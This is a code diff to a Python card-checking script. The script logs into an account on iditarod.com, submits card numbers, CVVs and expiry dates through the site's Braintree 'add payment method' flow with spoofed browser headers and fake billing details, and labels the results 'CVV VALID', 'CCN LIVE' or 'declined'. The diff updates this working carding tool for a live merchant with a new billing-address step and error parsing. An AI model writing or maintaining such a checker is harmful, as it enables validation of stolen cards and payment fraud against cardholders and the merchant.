@@ -9,7 +9,6 @@ from __future__ import annotations
 import base64
 import json
 import re
-import secrets
 import threading
 import uuid
 from typing import Optional, Tuple
@@ -19,6 +18,8 @@ from bs4 import BeautifulSoup
 
 BASE_URL = "https://iditarod.com"
 LOGIN_URL = f"{BASE_URL}/my-account/"
+EDIT_BILLING_URL = f"{BASE_URL}/my-account/edit-address/billing/"
+EDIT_ADDRESS_URL = f"{BASE_URL}/my-account/edit-address/"
 PAYMENT_METHODS_URL = f"{BASE_URL}/my-account/payment-methods/"
 ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"
 ADMIN_AJAX_URL = f"{BASE_URL}/wp-admin/admin-ajax.php"
@@ -74,11 +75,12 @@ def _normalize_proxy(proxy: Optional[str]) -> Optional[dict]:
 
 
 def _card_brand(cc: str) -> str:
+    """WooCommerce Braintree card-type: visa, master-card, amex, discover."""
     n = (cc or "").strip()
     if n.startswith("4"):
         return "visa"
     if n.startswith("5") or n.startswith("2"):
-        return "mastercard"
+        return "master-card"
     if n.startswith("3"):
         return "amex"
     if n.startswith("6"):
@@ -90,7 +92,7 @@ def _default_headers(referer: str = "", origin: str = BASE_URL) -> dict:
     return {
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "accept-language": "en-US,en;q=0.9",
-        "sec-ch-ua": '"Chromium";v="138", "Google Chrome";v="138", "Not_A Brand";v="24"',
+        "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
         "sec-ch-ua-mobile": "?0",
         "sec-ch-ua-platform": '"Windows"',
         "sec-fetch-dest": "document",
@@ -98,7 +100,7 @@ def _default_headers(referer: str = "", origin: str = BASE_URL) -> dict:
         "sec-fetch-site": "none" if not referer else "same-origin",
         "sec-fetch-user": "?1",
         "upgrade-insecure-requests": "1",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
         "referer": referer or BASE_URL + "/",
         "origin": origin,
     }
@@ -146,6 +148,26 @@ def _parse_add_payment_nonce(html: str) -> Optional[str]:
     return inp.get("value") if inp else None
 
 
+def _parse_edit_address_nonce(html: str) -> Optional[str]:
+    m = re.search(
+        r'name=["\']woocommerce-edit-address-nonce["\']\s+value=["\']([^"\']+)["\']',
+        html,
+        re.I,
+    )
+    if m:
+        return m.group(1)
+    m = re.search(
+        r'value=["\']([^"\']+)["\'][^>]*name=["\']woocommerce-edit-address-nonce["\']',
+        html,
+        re.I,
+    )
+    if m:
+        return m.group(1)
+    soup = BeautifulSoup(html, "html.parser")
+    inp = soup.find("input", {"name": "woocommerce-edit-address-nonce"})
+    return inp.get("value") if inp else None
+
+
 def _parse_woo_errors(html: str) -> list[str]:
     errs = []
     soup = BeautifulSoup(html, "html.parser")
@@ -162,27 +184,48 @@ def _parse_woo_errors(html: str) -> list[str]:
     return errs
 
 
+def _parse_status_code_response(html: str) -> Optional[str]:
+    """Extract 'Status code XXXX: ...' from woocommerce-error li (prefix Status code, suffix </li>)."""
+    m = re.search(r'woocommerce-error[\s\S]*?<li[^>]*>\s*(Status code[^<]*?)\s*</li>', html, re.I)
+    if m:
+        return m.group(1).strip()
+    m = re.search(r'Status code\s+[^<]+', html, re.I)
+    if m:
+        return m.group(0).strip()
+    soup = BeautifulSoup(html, "html.parser")
+    ul = soup.find("ul", class_=re.compile(r"woocommerce-error", re.I))
+    if ul:
+        for li in ul.find_all("li"):
+            t = (li.get_text() or "").strip()
+            if "Status code" in t or "status code" in t.lower():
+                return t
+    errs = _parse_woo_errors(html)
+    return errs[0] if errs else None
+
+
 def _map_response_to_status(err_msg: str) -> Tuple[str, str]:
     u = err_msg.upper()
     if any(x in u for x in ("CVV", "CVC", "SECURITY CODE", "VERIFICATION")):
-        return "ccn", f"CCN LIVE - {err_msg[:55]}"
-    if any(x in u for x in ("DECLINED", "DO NOT HONOR", "NOT AUTHORIZED", "INVALID", "EXPIRED", "LOST", "STOLEN", "PICKUP", "RESTRICTED", "FRAUD", "REVOKED")):
-        return "declined", f"Declined: {err_msg[:55]}"
+        return "ccn", err_msg[:80]
+    if any(x in u for x in ("DECLINED", "DO NOT HONOR", "NOT AUTHORIZED", "INVALID", "EXPIRED", "LOST", "STOLEN", "PICKUP", "RESTRICTED", "FRAUD", "REVOKED", "CANNOT AUTHORIZE", "POLICY", "DO NOT TRY AGAIN")):
+        return "declined", err_msg[:80]
     if any(x in u for x in ("INSUFFICIENT", "LIMIT")):
-        return "declined", f"Declined: {err_msg[:55]}"
+        return "declined", err_msg[:80]
     if any(x in u for x in ("STATUS CODE 2001", "2001")):
-        return "declined", "Declined: Do Not Honor"
+        return "declined", err_msg[:80]
     if any(x in u for x in ("STATUS CODE 2002", "2002")):
-        return "declined", "Declined: Insufficient Funds"
+        return "declined", err_msg[:80]
     if any(x in u for x in ("STATUS CODE 2003", "2003")):
-        return "declined", "Declined: Limit Exceeded"
+        return "declined", err_msg[:80]
     if any(x in u for x in ("STATUS CODE 2004", "2004")):
-        return "ccn", "CCN LIVE - Invalid CVV"
+        return "ccn", err_msg[:80]
     if any(x in u for x in ("STATUS CODE 2005", "2005")):
-        return "declined", "Declined: Invalid Number"
+        return "declined", err_msg[:80]
     if any(x in u for x in ("STATUS CODE 2006", "2006")):
-        return "declined", "Declined: Expired"
-    return "error", err_msg[:60]
+        return "declined", err_msg[:80]
+    if "STATUS CODE" in u or "2106" in u:
+        return "declined", err_msg[:80]
+    return "error", err_msg[:80]
 
 
 def run_iditarod_check(
@@ -252,7 +295,40 @@ def run_iditarod_check(
                     last_error = {"status": "error", "response": "Login failed (check account)"}
                 continue
 
-            session.get(PAYMENT_METHODS_URL, headers=_default_headers(referer=LOGIN_URL), **kw)
+            r = session.get(EDIT_BILLING_URL, headers=_default_headers(referer=LOGIN_URL), **kw)
+            if r.status_code != 200:
+                last_error = {"status": "error", "response": "Edit billing page failed"}
+                continue
+            edit_nonce = _parse_edit_address_nonce(r.text)
+            if not edit_nonce:
+                last_error = {"status": "error", "response": "Edit address nonce missing"}
+                continue
+            billing_data = {
+                "billing_first_name": "Mass",
+                "billing_last_name": "TH",
+                "billing_country": "US",
+                "billing_address_1": "7th street",
+                "billing_address_2": "bridge road",
+                "billing_city": "california",
+                "billing_state": "CA",
+                "billing_postcode": "90001",
+                "billing_phone": "17472920712",
+                "billing_email": email,
+                "save_address": "Save address",
+                "woocommerce-edit-address-nonce": edit_nonce,
+                "_wp_http_referer": "/my-account/edit-address/billing/",
+                "action": "edit_address",
+            }
+            h = _default_headers(referer=EDIT_BILLING_URL, origin=BASE_URL)
+            h["content-type"] = "application/x-www-form-urlencoded"
+            h["cache-control"] = "max-age=0"
+            r = session.post(EDIT_BILLING_URL, headers=h, data=billing_data, **kw)
+            if r.status_code != 200:
+                last_error = {"status": "error", "response": "Save billing failed"}
+                continue
+
+            session.get(EDIT_ADDRESS_URL, headers=_default_headers(referer=EDIT_BILLING_URL), **kw)
+            session.get(PAYMENT_METHODS_URL, headers=_default_headers(referer=EDIT_ADDRESS_URL), **kw)
 
             r = session.get(ADD_PAYMENT_URL, headers=_default_headers(referer=PAYMENT_METHODS_URL), **kw)
             if r.status_code != 200:
@@ -290,7 +366,6 @@ def run_iditarod_check(
             except Exception as e:
                 return {"status": "error", "response": f"Token decode error: {str(e)[:30]}"}
 
-            correlation = secrets.token_hex(16)
             tokenize_payload = {
                 "clientSdkMetadata": {
                     "source": "client",
@@ -305,13 +380,6 @@ def run_iditarod_check(
                             "expirationMonth": mes,
                             "expirationYear": yy,
                             "cvv": cvv,
-                            "billingAddress": {
-                                "postalCode": "10001",
-                                "streetAddress": "123 Main St",
-                                "locality": "New York",
-                                "region": "NY",
-                                "countryCodeAlpha2": "US",
-                            },
                         },
                         "options": {"validate": False},
                     }
@@ -329,7 +397,7 @@ def run_iditarod_check(
                 "sec-fetch-dest": "empty",
                 "sec-fetch-mode": "cors",
                 "sec-fetch-site": "cross-site",
-                "user-agent": session.headers.get("user-agent", "Mozilla/5.0 Chrome/138.0.0.0"),
+                "user-agent": session.headers.get("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/144.0.0.0 Safari/537.36"),
             }
             r = session.post(BRAINTREE_GRAPHQL, headers=bt_headers, json=tokenize_payload, **kw)
             if r.status_code != 200:
@@ -356,23 +424,15 @@ def run_iditarod_check(
                 "content-type": "application/x-www-form-urlencoded",
                 "cache-control": "max-age=0",
             }
-            device = json.dumps({"correlation_id": correlation})
             form_data = [
                 ("payment_method", "braintree_credit_card"),
                 ("wc-braintree-credit-card-card-type", brand),
                 ("wc-braintree-credit-card-3d-secure-enabled", ""),
                 ("wc-braintree-credit-card-3d-secure-verified", ""),
                 ("wc-braintree-credit-card-3d-secure-order-total", "0.00"),
-                ("wc-braintree-credit-card-cart-contains-subscription", "0"),
                 ("wc_braintree_credit_card_payment_nonce", tt),
-                ("wc_braintree_device_data", device),
+                ("wc_braintree_device_data", ""),
                 ("wc-braintree-credit-card-tokenize-payment-method", "true"),
-                ("wc_braintree_paypal_payment_nonce", ""),
-                ("wc-braintree-paypal-context", "shortcode"),
-                ("wc-braintree-paypal-amount", "0.00"),
-                ("wc-braintree-paypal-currency", "USD"),
-                ("wc-braintree-paypal-locale", "en_us"),
-                ("wc-braintree-paypal-tokenize-payment-method", "true"),
                 ("woocommerce-add-payment-method-nonce", add_payment_nonce),
                 ("_wp_http_referer", "/my-account/add-payment-method/"),
                 ("woocommerce_add_payment_method", "1"),
@@ -395,11 +455,15 @@ def run_iditarod_check(
                 br = cc_info.get("brandCode") or "N/A"
                 return {"status": "approved", "response": f"CVV VALID ✓ | {br} | Bank: {bank}"}
 
+            status_code_msg = _parse_status_code_response(txt)
+            if status_code_msg:
+                st, _ = _map_response_to_status(status_code_msg)
+                return {"status": st, "response": status_code_msg}
             errs = _parse_woo_errors(txt)
             if errs:
                 raw = " ".join(errs)
-                st, resp = _map_response_to_status(raw)
-                return {"status": st, "response": resp}
+                st, _ = _map_response_to_status(raw)
+                return {"status": st, "response": raw}
 
             if "woocommerce-error" in txt.lower():
                 return {"status": "error", "response": "Card declined (no message)"}
